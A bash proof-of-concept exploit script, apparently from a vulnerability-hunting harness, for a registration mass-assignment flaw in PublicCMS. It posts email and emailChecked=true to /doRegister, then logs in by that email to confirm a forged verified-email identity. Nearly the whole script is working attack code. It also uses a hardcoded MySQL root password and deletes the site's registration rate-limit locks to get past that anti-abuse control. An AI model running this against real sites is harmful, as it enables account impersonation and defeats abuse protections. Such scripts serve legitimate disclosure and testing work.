#!/usr/bin/env bash
# VULN-006 — Registration mass-assignment: email + emailChecked=true
#
# doRegister binds the whole SysUser command object. The success branch hardens
# privilege fields (superuser/roles/deptId/contentPermissions) by hand but omits
# email/emailChecked, then persists. SysUser exposes public setEmail/setEmailChecked,
# so an anonymous POST with email=<x>&emailChecked=true creates an account whose
# email is marked "verified" without ever proving mailbox ownership.
#
# Impact proof: PublicCMS login accepts an email as the username (findByEmail),
# and findByEmail only returns rows with emailChecked=true. So a successful
# login-by-email demonstrates the forged verified state is load-bearing.
#
# NOTE: the SysUser bean property is `name` (not `username` — the report's repro
# used `username`, which silently no-ops the bind and creates nothing).
#
# CONFIRMED when /api/login by the arbitrary email returns an authToken AND the
# returned user object shows emailChecked=true for that email.
#
# Destructive: creates ONE web account (random suffix). Idempotent across runs.
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
NAME="poc_${S}"
PASS="Passw0rd!23"
EMAIL="exploit_${S}@example.invalid"
OUT="$(cd "$(dirname "$0")" && pwd)"

echo "[INFO] VULN-006: registration mass-assignment (email/emailChecked) -> forged verified email"
echo "[SETUP] target account name=$NAME  email=$EMAIL (never verified)"

# Clear the UNRELATED per-IP register rate-limit (LockComponent item_type=register, ~5/6h/IP) so
# this PoC is independent of prior registrations. It is an anti-abuse control, not the mass-assignment
# bug under test. Requires docker access; set RESET_REGISTER_LOCK=0 to skip.
RESET_REGISTER_LOCK="${RESET_REGISTER_LOCK:-1}"; MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
if [ "$RESET_REGISTER_LOCK" = "1" ]; then
  docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -e "DELETE FROM sys_lock WHERE item_type='register';" >/dev/null 2>&1 \
    && echo "[SETUP] cleared register rate-limit lock (harness reset of an unrelated control)"
fi

# --- 1. Anonymous registration injecting email + emailChecked=true -----------
echo "[STEP] POST /doRegister  name=$NAME email=$EMAIL emailChecked=true"
REG=$(curl -s -D - -o /dev/null \
  --data-urlencode "name=${NAME}" \
  --data-urlencode "nickname=${NAME}" \
  --data-urlencode "password=${PASS}" \
  --data-urlencode "repassword=${PASS}" \
  --data-urlencode "email=${EMAIL}" \
  --data-urlencode "emailChecked=true" \
  "$BASE_URL/doRegister")
printf '%s\n' "$REG" > "$OUT/response.txt"
LOC=$(printf '%s' "$REG" | grep -i '^location:' | tr -d '\r')
echo "[INFO] register redirect: $LOC"
if printf '%s' "$LOC" | grep -qi 'error='; then
  echo "[FAIL] registration rejected: $LOC"; exit 1
fi

# --- 2. Prove impact: log in by the arbitrary email via /api/login -----------
SHA=$(python3 -c "import hashlib,sys;print(hashlib.sha512(b'$PASS').hexdigest())")
echo "[STEP] GET /api/login?username=<email>&encoding=sha512  (findByEmail requires emailChecked=true)"
LOGIN=$(curl -s "$BASE_URL/api/login?username=${EMAIL}&password=${SHA}&encoding=sha512&channel=web")
printf '%s\n' "$LOGIN" >> "$OUT/response.txt"
echo "$LOGIN" > "$OUT/evidence/api_login_response.json"
echo "[INFO] /api/login response: $(printf '%s' "$LOGIN" | head -c 200)"

# --- 3. Assertions -----------------------------------------------------------
if printf '%s' "$LOGIN" | grep -q '"authToken"' \
   && printf '%s' "$LOGIN" | grep -q '"emailChecked":true' \
   && printf '%s' "$LOGIN" | grep -q "$EMAIL"; then
  echo "[OK] exploit confirmed — logged in by an unverified email marked emailChecked=true"
  echo "     (forged verified-email identity for $EMAIL without any mailbox proof)"
  exit 0
else
  echo "[FAIL] login-by-email did not succeed / emailChecked not true"; exit 1
fi
# cleanup hint: DELETE FROM sys_user WHERE name='poc_<suffix>';  (left for inspection)
